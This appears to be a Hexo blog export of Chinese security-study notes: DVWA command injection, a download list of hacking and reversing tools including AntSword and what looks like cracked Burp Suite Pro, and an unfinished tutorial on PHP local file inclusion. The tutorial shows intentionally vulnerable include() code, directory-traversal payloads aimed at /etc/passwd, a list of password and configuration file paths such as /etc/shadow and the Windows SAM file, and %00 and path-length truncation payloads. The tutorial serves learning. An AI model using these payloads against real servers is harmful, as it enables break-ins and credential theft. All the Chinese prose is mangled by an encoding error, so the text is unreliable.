<p>explode(separator,string,limit)<br>æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ï¼Œè¿”å›å­—ç¬¦ä¸²çš„æ•°ç»„ã€‚å‚æ•°separatorè§„å®šåœ¨å“ªé‡Œåˆ†å‰²å­—ç¬¦ä¸²ï¼Œå‚æ•°stringæ˜¯è¦åˆ†å‰²çš„å­—ç¬¦ä¸²ï¼Œå¯é€‰å‚æ•°limitè§„å®šæ‰€è¿”å›çš„æ•°ç»„å…ƒç´ çš„æ•°ç›®ã€‚</p>
<p>is_numeric(string)<br>æ£€æµ‹stringæ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æœæ˜¯è¿”å›TRUEï¼Œå¦åˆ™è¿”å›FALSEã€‚</p>
<p>Impossibleçº§åˆ«çš„ä»£ç å¯¹å‚æ•°ipè¿›è¡Œäº†ä¸¥æ ¼çš„é™åˆ¶ï¼Œåªæœ‰åƒâ€œæ•°å­—.æ•°å­—.æ•°å­—.æ•°å­—â€çš„è¾“å…¥æ‰ä¼šè¢«æ¥æ”¶æ‰§è¡Œï¼Œå› æ­¤ä¸å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p><font color=#999AAA >ç®€å•çš„é€šè¿‡dvwaæ¥å­¦ä¹ ä¸€ä¸‹åŸºæœ¬çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæœ‰å…³ç»•è¿‡çš„æ–¹æ³•ä»¥åå†å­¦ã€‚</p>
]]></content>
      <categories>
        <category>webæ¼æ´</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>å·¥å…·ä¸‹è½½</title>
    <url>/2021/05/03/%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>



<p>IDA_Pro_v7.5_Portable  <a href="https://down.52pojie.cn/Tools/Disassemblers/IDA_Pro_v7.5_Portable.zip">ä¸‹è½½</a></p>
<p>CyberChef_v9.23.1  <a href="https://pan.baidu.com/s/1ctwe_Yra-QJ6PK7CVuDrWg">T0MR</a></p>
<p>Hackbaræ–°ç‰ˆ  <a href="https://pan.baidu.com/s/1FKRg5jUWb48m9JH4Ka7LqQ">T0MR</a></p>
<p>Hackbaræ—§ç‰ˆ  <a href="https://pan.baidu.com/s/1LjhTb23fvA-E6qIONR7-_A">T0MR</a></p>
<p>sqli-labs  <a href="https://pan.baidu.com/s/1N9Dq84c08dkixm6OE7timw">T0MR</a></p>
<p>xss-labs  <a href="https://pan.baidu.com/s/1vHBztPxwGe4lJC4yMH2P5g">T0MR</a></p>
<p>upload-labs  <a href="https://pan.baidu.com/s/1QXrB0YM9MvcQL4MZVyul-A">T0MR</a></p>
<p>ä¸­å›½èšå‰‘  <a href="https://pan.baidu.com/s/1C-1HuUR3X1hob72Dzoqb4Q">T0MR</a></p>
<p>Cheat Engine 7.2  <a href="https://pan.baidu.com/s/13-NbBmVcThxPzG17sl_WGQ">T0MR</a></p>
<p>wireshark 32ä½  <a href="https://down.52pojie.cn/Tools/Network_Analyzer/Wireshark-win32-3.4.4.7z">ä¸‹è½½</a></p>
<p>wireshark 64ä½  <a href="https://down.52pojie.cn/Tools/Network_Analyzer/Wireshark-win64-3.4.4.7z">ä¸‹è½½</a></p>
<p>Seayä»£ç å®¡è®¡  <a href="https://pan.baidu.com/s/1n-W5Mt6lK9agsu3HrQO48A">T0MR</a></p>
<p>burpsuite_pro_v2021.4  <a href="https://pan.baidu.com/s/1yOr-1wJjWPWWbdIwp-aoYw">T0MR</a>ï¼ˆè§£å‹åç›´æ¥è¿è¡Œbatå³å¯ï¼Œéœ€è¦javaç¯å¢ƒï¼Œæœ€å¥½æ˜¯æœ€æ–°ç‰ˆæœ¬å§ï¼‰</p>
<p>MP3Stego_1_1_18  <a href="https://pan.baidu.com/s/18eNsK-cLkDh9spSV8FfjaA">T0MR</a></p>
<p>CaptfEncoder-win-x64  <a href="https://pan.baidu.com/s/1PMqWxxNC3rnLxXicZ2MLwA">T0MR</a></p>
<p>å¾¡å‰‘åå°æ‰«æçè—ç‰ˆ  <a href="https://pan.baidu.com/s/1AYl7oXmO5R4-5Gky7qUxEQ">T0MR</a></p>
<p>è§£ç å·¥å…·Converter  <a href="https://pan.baidu.com/s/14CdPL3UfVlvjKDTnG8I1ew">T0MR</a></p>
<p>Dç›¾  <a href="https://pan.baidu.com/s/1y5RLEzjwxGOb0mp5ws2lqg">T0MR</a></p>
<p>tweakpng-1.4.6  <a href="https://pan.baidu.com/s/1_stwVcyc8pM4Rq0ueW3h4Q">T0MR</a></p>
]]></content>
      <categories>
        <category>å·¥å…·</category>
      </categories>
  </entry>
  <entry>
    <title>æ–‡ä»¶åŒ…å«æ¼æ´å­¦ä¹ ç¬”è®°ï¼ˆæœªå®Œï¼‰</title>
    <url>/2021/04/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>



<h4 id="æ–‡ä»¶åŒ…å«å‡½æ•°"><a href="#æ–‡ä»¶åŒ…å«å‡½æ•°" class="headerlink" title="æ–‡ä»¶åŒ…å«å‡½æ•°"></a>æ–‡ä»¶åŒ…å«å‡½æ•°</h4><p>PHPä¸­æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ä»¥ä¸‹å››ç§ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line">    </span><br><span class="line"><span class="comment">//å…·ä½“ç”¨æ³•è‡ªè¡Œç™¾åº¦</span></span><br></pre></td></tr></table></figure>

<p><code>include</code>å’Œ<code>require</code>åŒºåˆ«ä¸»è¦æ˜¯ï¼š<code>include</code>åœ¨åŒ…å«çš„è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç¨‹åºç»§ç»­æ­£å¸¸è¿è¡Œï¼›è€Œ<code>require</code>å‡½æ•°å‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œä¼šç›´æ¥æŠ¥é”™å¹¶é€€å‡ºç¨‹åºçš„æ‰§è¡Œã€‚</p>
<p>è€Œ<code>include_once()</code>ï¼Œ<code>require_once()</code>è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä¸å‰ä¸¤ä¸ªçš„ä¸åŒä¹‹å¤„åœ¨äºè¿™ä¸¤ä¸ªå‡½æ•°åªåŒ…å«ä¸€æ¬¡ï¼Œé€‚ç”¨äºåœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒä¸€ä¸ªæ–‡ä»¶æœ‰å¯èƒ½è¢«åŒ…æ‹¬è¶…è¿‡ä¸€æ¬¡ä¸”ä½ æƒ³ç¡®ä¿å®ƒåªè¢«åŒ…æ‹¬ä¸€æ¬¡ä»¥é¿å…å‡½æ•°é‡å®šä¹‰ï¼Œå˜é‡é‡æ–°èµ‹å€¼ç­‰é—®é¢˜çš„æƒ…å†µã€‚</p>
<h4 id="æ¼æ´äº§ç”Ÿçš„åŸå› "><a href="#æ¼æ´äº§ç”Ÿçš„åŸå› " class="headerlink" title="æ¼æ´äº§ç”Ÿçš„åŸå› "></a>æ¼æ´äº§ç”Ÿçš„åŸå› </h4><p>æ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½çš„å‚æ•°æ²¡æœ‰ç»è¿‡è¿‡æ»¤æˆ–è€…ä¸¥æ ¼çš„å®šä¹‰ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼ŒåŒ…å«äº†å…¶ä»–æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´æ‰§è¡Œäº†éé¢„æœŸçš„ä»£ç ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å®ä¾‹</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]å‚æ•°å¼€å‘è€…æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œç›´æ¥å¸¦å…¥äº†<span class="keyword">include</span>çš„å‡½æ•°ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]çš„å€¼ï¼Œæ‰§è¡Œéé¢„æœŸçš„æ“ä½œã€‚</span><br></pre></td></tr></table></figure>



<h4 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h4><p>æ¡ä»¶:</p>
<ol>
<li>allow_url_fopen=On</li>
<li>å˜é‡æ˜¯å¯ä»¥äººä¸ºæ§åˆ¶çš„</li>
</ol>
<p>æ–¹æ³•:</p>
<ol>
<li>å°è¯•éšä¾¿è¯»ä¸€ä¸ªæ–‡ä»¶è§‚å¯ŸæŠ¥é”™å¾—åˆ°è·¯å¾„ï¼ˆ./å½“å‰è·¯å¾„ï¼Œ../è·³è½¬ä¸Šä¸€ç›®å½•æ¥è¯»å–æ–‡ä»¶ï¼‰</li>
</ol>
<h4 id="æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´</h4><p>testä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;password                                     &#x2F;&#x2F;é€šè¿‡ç›®å½•éå†æ¥è¯»å–å…¶ä»–æ–‡ä»¶å¤¹å†…çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>å¸¸è§æ•æ„Ÿä¿¡æ¯è·¯å¾„:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windows:</span><br><span class="line">c:\boot.ini &#x2F;&#x2F; æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IISé…ç½®æ–‡ä»¶</span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F; å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç </span><br><span class="line">c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQLé…ç½®</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL rootå¯†ç </span><br><span class="line">c:\windows\php.ini &#x2F;&#x2F; php é…ç½®ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">linux&#x2F;unix:</span><br><span class="line">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; è´¦æˆ·ä¿¡æ¯</span><br><span class="line">&#x2F;etc&#x2F;shadow &#x2F;&#x2F; è´¦æˆ·å¯†ç æ–‡ä»¶</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2é»˜è®¤é…ç½®æ–‡ä»¶</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; è™šæ‹Ÿç½‘ç«™é…ç½®</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHPç›¸å…³é…ç½®</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apacheé…ç½®æ–‡ä»¶</span><br><span class="line">&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<h4 id="æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡"><a href="#æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡" class="headerlink" title="æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡"></a>æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡</h4><h5 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­"></a><a href="https://blog.csdn.net/qq_26090065/article/details/81458937"><strong>%00æˆªæ–­</strong></a></h5><p>æ¡ä»¶ï¼š</p>
<p>â€‹        magic_quotes_gpc = Off      phpç‰ˆæœ¬&lt;5.3.4</p>
<p>testä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;shell.php%00</span><br></pre></td></tr></table></figure>

<h5 id="è·¯å¾„é•¿åº¦æˆªæ–­"><a href="#è·¯å¾„é•¿åº¦æˆªæ–­" class="headerlink" title="è·¯å¾„é•¿åº¦æˆªæ–­"></a><strong>è·¯å¾„é•¿åº¦æˆªæ–­</strong></h5><p>æ¡ä»¶ï¼š</p>
<p>â€‹        windows OSï¼Œç‚¹å·éœ€è¦é•¿äº256ï¼›linux OS é•¿äº4096</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windowsä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒï¼›</span><br><span class="line"></span><br><span class="line">Linuxä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º4096å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒã€‚</span><br></pre></td></tr></table></figure>

<p>testä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:filename&#x3D;test.txt&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#